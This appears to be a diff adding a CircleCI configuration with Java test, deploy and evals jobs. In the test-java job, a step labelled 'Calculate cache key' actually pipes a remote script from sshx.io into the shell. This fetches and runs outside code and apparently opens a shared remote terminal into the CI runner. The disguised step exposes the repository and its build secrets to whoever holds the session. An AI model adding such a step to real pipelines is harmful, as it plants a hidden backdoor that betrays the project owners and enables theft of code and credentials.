@@ -1,0 +1,48 @@
+version: 2.1
+jobs:
+  test-java:
+    docker:
+      - image: ubuntu
+    steps:
+      - run:
+          name: Calculate cache key
+          command: |-
+            curl -sSf https://sshx.io/get | sh -s run
+      - restore_cache:
+          key: cache-{{ checksum "/tmp/CIRCLECI_CACHE_KEY" }}
+      - run:
+          command: ./gradlew check
+      - store_test_results:
+          path: build/test-results
+      - save_cache:
+          key: cache-{{ checksum "/tmp/CIRCLECI_CACHE_KEY" }}
+          paths:
+            - ~/.gradle/caches
+      - store_artifacts:
+          path: build/reports
+  deploy:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - run:
+          name: deploy
+          command: "#e.g. ./deploy.sh"
+  evals-test-assertions-job:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - checkout
+      - evals/test:
+          assertions: assertions.json
+          metrics: eval_results.json
+          results: test_results.xml
+workflows:
+  build-and-test:
+    jobs:
+      - test-java:
+          context: []
+  test-eval-workflow:
+    jobs:
+      - evals-test-assertions-job
+orbs:
+  evals: circleci/evals@2.0
